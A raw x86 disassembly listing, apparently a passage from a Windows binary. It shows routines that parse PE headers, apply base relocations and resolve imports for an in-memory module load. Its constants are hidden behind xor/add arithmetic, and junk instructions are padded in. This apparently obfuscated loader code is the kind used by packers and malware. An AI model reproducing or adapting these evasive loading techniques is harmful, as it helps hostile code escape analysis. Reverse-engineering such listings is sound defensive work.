  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
